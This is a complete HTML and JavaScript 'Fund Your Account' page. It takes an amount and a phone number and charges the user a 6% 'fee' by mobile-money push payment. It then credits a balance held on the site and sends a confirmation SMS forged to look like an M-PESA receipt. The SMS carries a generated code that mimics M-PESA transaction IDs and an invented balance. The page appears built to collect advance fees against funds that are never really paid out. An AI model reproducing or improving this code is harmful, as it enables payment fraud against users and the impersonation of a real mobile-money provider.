
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Fund Account - Pay Fee Only</title>

<style>
:root { --primary:#4CAF50; --dark:#121212; --card:#1e1e1e; }

body{
    font-family:'Segoe UI',sans-serif;
    background:var(--dark);
    color:white;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
    margin:0;
}

.card{
    background:var(--card);
    padding:2rem;
    border-radius:12px;
    box-shadow:0 10px 25px rgba(0,0,0,0.5);
    width:100%;
    max-width:380px;
    text-align:center;
    border:1px solid #333;
}

h2{ color:var(--primary); font-size:1.4rem; }

.balance-display{
    background:#121212;
    padding:15px;
    border-radius:8px;
    margin:15px 0;
}

input{
    width:100%;
    padding:12px;
    margin:10px 0;
    background:#121212;
    border:1px solid #444;
    color:white;
}

button{
    width:100%;
    padding:14px;
    background:var(--primary);
    border:none;
    color:white;
    font-weight:bold;
}

#status{ margin-top:15px; }

.loader{
    display:inline-block;
    width:16px;
    height:16px;
    border:2px solid rgba(255,255,255,.3);
    border-top-color:#fff;
    border-radius:50%;
    animation:spin 1s linear infinite;
}

@keyframes spin{ to{ transform:rotate(360deg); } }
</style>
</head>

<body>

<div class="card">
<h2>Fund Your Account</h2>

<div class="balance-display">
<div id="currentBalance">Loading...</div>
</div>

<input type="number" id="fundAmount" placeholder="Amount (Min 100)">
<input type="text" id="paymentPhone" placeholder="07xxxxxxxx">

<button id="payBtn">Pay Fee & Request Funds</button>

<div id="status"></div>
</div>

<script>
const BACKEND_PAYMENT="https://newpayment-byr6.vercel.app";
const BACKEND_FUNDS="https://funds-mauve.vercel.app/api";
const MESSAGE_API="https://message-server-five.vercel.app";

const userData=JSON.parse(localStorage.getItem('mledger_user'));
if(!userData) location.href="index.html";

/* ---------------- FIX: SMART FETCH ---------------- */

async function fetchSafe(url, options={}, retries=3, timeout=10000){
    for(let i=0;i<retries;i++){
        try{
            const controller=new AbortController();
            const id=setTimeout(()=>controller.abort(), timeout);

            const res=await fetch(url,{...options,signal:controller.signal});
            clearTimeout(id);

            return res;
        }catch(e){
            if(i===retries-1) throw e;
        }
    }
}

/* ---------------- BALANCE ---------------- */

async function fetchBalance(){
    try{
        const res=await fetchSafe(`${BACKEND_FUNDS}/balance/${userData.phone}`);
        const data=await res.json();
        document.getElementById('currentBalance').innerText=
            "Ksh "+(data.balance||0).toLocaleString();
    }catch{
        document.getElementById('currentBalance').innerText="Ksh 0.00";
    }
}
fetchBalance();

/* ---------------- TOKEN ---------------- */

function getYearLetter(){ return String.fromCharCode(85+(new Date().getFullYear()-2026)); }
function getMonthThirdLetter(){ return "ABCDEFGHIJKLMN"[new Date().getMonth()]; }
function getDayCode(){
    let d=new Date().getDate();
    return d<=9?d:String.fromCharCode(65+(d-10));
}
function formatNumericDate(){
    let n=new Date();
    return `${String(n.getDate()).padStart(2,'0')}/${String(n.getMonth()+1).padStart(2,'0')}/${n.getFullYear()}`;
}
function formatTime12Hour(){
    return new Date().toLocaleTimeString('en-US',{hour:'numeric',minute:'2-digit',hour12:true});
}
function generateToken(){
    return `${getYearLetter()}${getMonthThirdLetter()}${getDayCode()}K${Math.random().toString(36).substring(2,8).toUpperCase()}`;
}

/* ---------------- MAIN ---------------- */

document.getElementById("payBtn").onclick=async ()=>{
    const amt=parseFloat(fundAmount.value);
    const phone=paymentPhone.value.trim();
    const status=document.getElementById("status");
    const btn=document.getElementById("payBtn");

    if(isNaN(amt)||amt<100){
        status.innerText="Minimum funding amount is Ksh 100.00";
        return;
    }

    const stkAmount=Math.ceil(amt*0.06);

    btn.disabled=true;
    btn.innerHTML='<span class="loader"></span> Processing...';

    try{
        const res=await fetchSafe(`${BACKEND_PAYMENT}/api/initiate`,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({amount:stkAmount,phone_number:phone})
        });

        const data=await res.json();
        const id=data.invoice?.invoice_id||data.id;

        if(!id) throw new Error("STK failed");

        pollStatus(id,amt);

    }catch(e){
        status.innerText="Network problem. Try again.";
        btn.disabled=false;
        btn.innerText="Pay Fee & Request Funds";
    }
};

/* ---------------- POLLING FIX ---------------- */

function pollStatus(id,amt){
    let attempts=0;

    const timer=setInterval(async ()=>{
        attempts++;

        try{
            const res=await fetchSafe(`${BACKEND_PAYMENT}/api/status/${id}`);
            const d=await res.json();
            const state=d.invoice?.state||d.state;

            if(state==="COMPLETE"||state==="COMPLETED"){
                clearInterval(timer);
                finalizeFunding(amt);
            }

            if(state==="FAILED"||attempts>40){
                clearInterval(timer);
                status.innerText="Payment failed.";
                resetUI();
            }

        }catch{
            // keep retrying silently
        }
    },3000);
}

/* ---------------- FINAL ---------------- */

async function finalizeFunding(amt){
    try{
        const res=await fetchSafe(`${BACKEND_FUNDS}/fund`,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({phone:userData.phone,amount:amt})
        });

        const result=await res.json();

        userData.balance=result.newBalance;
        localStorage.setItem('mledger_user',JSON.stringify(userData));

        const token=generateToken();
        const dateStr=formatNumericDate();
        const timeStr=formatTime12Hour();

        const confirmationMsg=`${token} Confirmed.You have received Ksh${amt.toFixed(2)} from Mledger intasend Solutions Limited 313031 on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${userData.balance.toFixed(2)}. Separate personal and business funds through pochi la Biashara on *334#`;

        fetchSafe(`${MESSAGE_API}/api/messages`,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({
                phone:userData.phone,
                message:confirmationMsg,
                type:'received'
            })
        }).catch(()=>{});

        status.innerHTML=`✅ Success<br>Ksh ${amt} added`;

        setTimeout(()=>location.href="index.html",3000);

    }catch{
        status.innerText="Funding failed.";
        resetUI();
    }
}

/* ---------------- RESET ---------------- */

function resetUI(){
    payBtn.disabled=false;
    payBtn.innerText="Pay Fee & Request Funds";
}
</script>

</body>
</html>
